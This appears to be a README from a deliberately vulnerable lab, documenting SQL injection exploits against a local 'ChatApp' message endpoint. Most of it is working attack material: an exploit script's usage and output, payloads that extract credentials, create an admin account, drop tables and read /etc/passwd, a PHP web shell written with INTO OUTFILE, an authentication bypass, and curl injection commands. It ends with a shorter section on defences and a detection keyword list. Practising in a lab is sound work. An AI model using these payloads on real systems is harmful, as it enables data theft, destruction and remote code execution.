# ChatApp - SQL Injection Exploits

## Overview
These exploits target SQL injection vulnerabilities in the ChatApp's message insertion functionality.

## Target Application
- **Project**: ChatApp
- **Port**: 5006
- **Vulnerable Feature**: Message posting
- **Vulnerability**: Unsanitized SQL queries when inserting messages

## Prerequisites
```bash
# Ensure ChatApp is running
docker-compose up -d chatapp
```

## Exploits

### sqli_insert.py
Exploits SQL injection in the message insertion endpoint.

**Usage:**
```bash
python3 sqli_insert.py
```

**What it does:**
- Registers a user account
- Logs in to get session
- Sends crafted messages with SQL injection payloads
- Injects malicious SQL in INSERT statement
- Can extract data, modify database, or escalate privileges

**Expected Output:**
```
[+] Targeting: http://localhost:5006
[+] Registering user: attacker
[+] Login successful
[+] Injecting SQL payload in message...
[+] Payload: '); SELECT * FROM users; --
[+] Injection successful!
[+] Data extracted:
[{'username': 'admin', 'password': 'hashed_password'}, ...]
```

## Attack Techniques

### 1. Basic Injection Test
```sql
# Test if vulnerable:
Message: ', (SELECT 1)) -- 

# This becomes:
INSERT INTO messages (user_id, message) VALUES (1, '', (SELECT 1)) -- )
```

### 2. Extract User Credentials
```sql
# Payload:
', (SELECT password FROM users WHERE username='admin')) -- 

# Full query:
INSERT INTO messages (user_id, message) VALUES (1, '', (SELECT password FROM users WHERE username='admin')) -- ')
```

### 3. Create Admin User
```sql
# Payload:
'); INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'pass123', 1); -- 

# Becomes:
INSERT INTO messages (user_id, message) VALUES (1, ''); 
INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'pass123', 1); -- ')
```

### 4. Union-Based Injection
```sql
# Payload:
' UNION SELECT username, password FROM users -- 

# Extract all usernames and passwords
```

### 5. Time-Based Blind SQLi
```sql
# Test vulnerability:
' OR SLEEP(5) -- 

# Extract data bit by bit:
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) -- 
```

## Manual Testing

### Via Web Interface:
1. Register and login at http://localhost:5006
2. Try these payloads in message field:
```
'); DROP TABLE messages; --
'); SELECT LOAD_FILE('/etc/passwd'); --
'); UPDATE users SET password='hacked' WHERE username='admin'; --
```

### Via curl:
```bash
# Login
TOKEN=$(curl -s -X POST http://localhost:5006/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}' | jq -r '.token')

# Inject SQL
curl -X POST http://localhost:5006/message \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"'); SELECT * FROM users; --\"}"
```

## Advanced Exploitation

### Enumerate Database:
```sql
# List tables
'); SELECT table_name FROM information_schema.tables WHERE table_schema=database(); --

# List columns
'); SELECT column_name FROM information_schema.columns WHERE table_name='users'; --

# Count rows
'); SELECT COUNT(*) FROM users; --
```

### File Operations (if FILE privilege exists):
```sql
# Read files
'); SELECT LOAD_FILE('/etc/passwd'); --

# Write files (requires FILE privilege)
'); SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --
```

### Bypass Authentication:
```sql
# In login endpoint (if also vulnerable):
Username: admin' OR '1'='1
Password: anything

# Becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

## Defense Recommendations

### 1. Use Parameterized Queries
```python
# VULNERABLE CODE:
message = request.json.get('message')
query = f"INSERT INTO messages (user_id, message) VALUES ({user_id}, '{message}')"
cursor.execute(query)

# SECURE CODE:
message = request.json.get('message')
query = "INSERT INTO messages (user_id, message) VALUES (?, ?)"
cursor.execute(query, (user_id, message))
```

### 2. Use ORM (SQLAlchemy)
```python
from sqlalchemy import create_engine, Column, String, Integer
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class Message(Base):
    __tablename__ = 'messages'
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer)
    message = Column(String)

# Safe insertion
new_message = Message(user_id=user_id, message=message)
session.add(new_message)
session.commit()
```

### 3. Input Validation
```python
import re

def sanitize_input(user_input):
    # Remove dangerous SQL characters
    dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
    
    for char in dangerous_chars:
        if char in user_input:
            raise ValueError("Invalid input detected")
    
    # Limit length
    if len(user_input) > 500:
        raise ValueError("Input too long")
    
    return user_input
```

### 4. Least Privilege
```sql
-- Create dedicated app user with minimal permissions
CREATE USER 'chatapp'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT, INSERT ON chatapp.messages TO 'chatapp'@'localhost';
GRANT SELECT ON chatapp.users TO 'chatapp'@'localhost';
-- NO UPDATE, DELETE, or FILE privileges
```

## Detection and Monitoring

### Log Suspicious Patterns:
```python
import logging

suspicious_patterns = [
    'union', 'select', 'drop', 'insert', 'update', 'delete',
    '--', '/*', '*/', 'xp_', 'sp_', 'exec', 'execute',
    'information_schema', 'load_file', 'into outfile'
]

def detect_sqli(input_string):
    for pattern in suspicious_patterns:
        if pattern in input_string.lower():
            logging.warning(f"Possible SQLi detected: {input_string}")
            return True
    return False
```

## Notes
**WARNING**: SQL injection can lead to:
- Complete database compromise
- User account takeover
- Data theft and modification
- Authentication bypass
- File system access (if FILE privilege)
- Remote code execution (via INTO OUTFILE + web shell)

## Related Exploits
- See `../rce/` for escalating to remote code execution
- See `../xss/` for combined SQLi + XSS attacks
- Combine with RCE to establish persistent access
